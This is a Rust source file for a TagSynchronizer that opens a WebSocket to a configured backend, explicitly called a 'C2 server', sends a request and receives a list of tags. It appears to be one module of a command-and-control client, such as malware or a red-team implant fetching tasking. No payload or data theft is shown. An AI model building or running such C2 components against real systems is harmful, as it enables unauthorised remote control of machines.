use log::{info, error};
use crate::system_initializer:: WebSocketClient;
use crate::config::configuration::CONFIG;
use serde_json;

pub struct TagSynchronizer {
    ws_client: WebSocketClient
}

impl TagSynchronizer {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let backend_url = CONFIG.get_base();
        let header_key = CONFIG.get_header_key();
        let header_value = CONFIG.get_header_value();
        
        let ws_client = WebSocketClient::new(backend_url.to_string(), header_key, header_value);
        
        Ok(TagSynchronizer {ws_client})
    }

    pub async fn get_tags(&mut self) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        if let Err(e) = self.ws_client.connect_to_c2_server().await {
            error!("Failed to connect to C2 server: {}", e);
            return Err(e);
        }

        let tag_request = CONFIG.get_message();
        let tag_request = serde_json::to_string(&tag_request)?;
        if let Err(e) = self.ws_client.send_tag_request(tag_request).await {
            error!("Failed to send request: {}", e);
            return Err(e);
        }

        let tags_vec = match self.ws_client.receive_response().await {
            Ok(tags) => tags,
            Err(e) => {
                error!("Failed to receive response: {}", e);
                return Err(e);
            }
        };

        info!("Tags received from C2: {}", tags_vec.len());
        Ok(tags_vec)
    }
}
